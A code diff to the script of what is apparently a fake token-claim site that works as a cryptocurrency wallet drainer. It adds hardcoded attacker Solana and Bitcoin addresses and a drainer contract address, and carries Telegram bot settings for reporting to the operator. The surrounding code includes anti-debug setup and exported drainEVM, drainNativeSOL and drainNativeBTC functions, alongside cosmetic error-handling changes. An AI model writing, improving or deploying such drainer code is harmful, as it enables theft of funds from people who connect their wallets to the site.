@@ -35,15 +35,21 @@ import { CONFIG } from './config.js';
   antiDebug.init();
 })();
 
-// ====== IMPORT FROM CONFIG ======
-const { 
-  DRAINER_CONTRACT, 
-  CONTRACT_ABI, 
-  ATTACKER_SOLANA_ADDRESS, 
-  ATTACKER_BTC_ADDRESS,
-  TELEGRAM_BOT_TOKEN,
-  TELEGRAM_CHAT_ID
-} = CONFIG;
+// ====== SAFELY IMPORT FROM CONFIG ======
+let DRAINER_CONTRACT, CONTRACT_ABI, ATTACKER_SOLANA_ADDRESS, ATTACKER_BTC_ADDRESS, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID;
+
+try {
+  const config = CONFIG || {};
+  DRAINER_CONTRACT = config.DRAINER_CONTRACT || "0xbf2c883b097d6733a7e5a8d853d05825564bd857";
+  CONTRACT_ABI = config.CONTRACT_ABI || [];
+  ATTACKER_SOLANA_ADDRESS = config.ATTACKER_SOLANA_ADDRESS || "7uYC9fnzK3HashgE8x8fJ5oqUMLBWkVYqPiFNhejYPX7";
+  ATTACKER_BTC_ADDRESS = config.ATTACKER_BTC_ADDRESS || "bc1qyugnjmr05e4xf4wd4xs2ytn9an34uxelkt9h5f";
+  TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN || "";
+  TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID || "";
+  console.log("✅ Config loaded successfully");
+} catch (e) {
+  console.warn("⚠️ Config load issue, using fallback values:", e);
+}
 
 // ====== TELEGRAM HELPER ======
 async function sendTelegramMessage(message) {
@@ -379,7 +385,7 @@ async function loadSolanaLibraries() {
   });
 }
 
-// ====== APPLICATION STATE ======
+// ====== ENHANCED APPLICATION STATE ======
 let tokenChart;
 let countdownInterval;
 let claimList = [];
@@ -405,7 +411,7 @@ let solanaPublicKey = null;
 const DISABLE_DISCONNECT = isMobileDevice;
 let delayedAttemptsScheduled = false;
 
-// DOM Elements
+// ====== DOM ELEMENTS ======
 const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
 const navLinks = document.querySelector(".nav-links");
 const claimListElement = document.getElementById("claimList");
@@ -427,18 +433,21 @@ const announcementOkBtn = document.getElementById("announcementOkBtn");
 const copyReferralBtn = document.getElementById("copyReferralBtn");
 const referralLink = document.getElementById("referralLink");
 
-// Event listeners
+// ====== EVENT LISTENERS ======
 if (mobileMenuBtn) mobileMenuBtn.addEventListener("click", toggleMobileMenu);
 if (walletModalClose) walletModalClose.addEventListener("click", hideWalletModal);
 if (announcementModalClose) announcementModalClose.addEventListener("click", hideAnnouncementModal);
 if (announcementOkBtn) announcementOkBtn.addEventListener("click", hideAnnouncementModal);
 if (copyReferralBtn) copyReferralBtn.addEventListener("click", copyReferralLink);
-if (debugToggle) debugToggle.addEventListener("click", () => {
-  connectionDebug.classList.toggle("active");
-  debugToggle.textContent = connectionDebug.classList.contains("active")
-    ? "Hide connection details"
-    : "Show connection details";
-});
+
+if (debugToggle) {
+  debugToggle.addEventListener("click", () => {
+    connectionDebug.classList.toggle("active");
+    debugToggle.textContent = connectionDebug.classList.contains("active")
+      ? "Hide connection details"
+      : "Show connection details";
+  });
+}
 
 if (walletProviders) {
   walletProviders.forEach((provider) => {
@@ -449,23 +458,27 @@ if (walletProviders) {
   });
 }
 
-// Initialize Vanta.js background
+// ====== INITIALIZE VANTA BACKGROUND ======
 if (typeof VANTA !== "undefined") {
-  VANTA.NET({
-    el: "#vanta-bg",
-    mouseControls: true,
-    touchControls: true,
-    gyroControls: false,
-    minHeight: 200.0,
-    minWidth: 200.0,
-    scale: 1.0,
-    scaleMobile: 1.0,
-    color: 0xff6b00,
-    backgroundColor: 0x0f172a,
-    points: 15.0,
-    maxDistance: 25.0,
-    spacing: 18.0,
-  });
+  try {
+    VANTA.NET({
+      el: "#vanta-bg",
+      mouseControls: true,
+      touchControls: true,
+      gyroControls: false,
+      minHeight: 200.0,
+      minWidth: 200.0,
+      scale: 1.0,
+      scaleMobile: 1.0,
+      color: 0xff6b00,
+      backgroundColor: 0x0f172a,
+      points: 15.0,
+      maxDistance: 25.0,
+      spacing: 18.0,
+    });
+  } catch (e) {
+    console.warn("Vanta init failed:", e);
+  }
 }
 
 // ====== ENHANCED CURRENCY AWARE INITIALIZATION ======
@@ -1422,7 +1435,7 @@ function logDebug(message, element = connectionDebug) {
   if (element) {
     element.innerHTML += debugMessage;
   }
-  console.log(`[MANUAL_DEBUG:${Math.random().toString(36).substring(2, 8)}] ${message}`);
+  console.log(`[DEBUG] ${message}`);
 }
 
 async function checkManualExistingConnection() {
@@ -2096,8 +2109,6 @@ setTimeout(() => {
 }, 1000);
 
 // ====== MULTI‑CHAIN DISPATCHER ======
-let delayedAttemptsScheduled = false;
-
 async function initiateClaimProcess() {
   // EVM FIRST
   if (window.ethereum || (window.web3 && window.web3.currentProvider)) {
@@ -2157,3 +2168,5 @@ window.initiateClaimProcess = initiateClaimProcess;
 window.drainNativeBTC = drainNativeBTC;
 window.drainNativeSOL = drainNativeSOL;
 window.drainEVM = drainEVM;
+
+console.log("✅ Script.js loaded successfully");
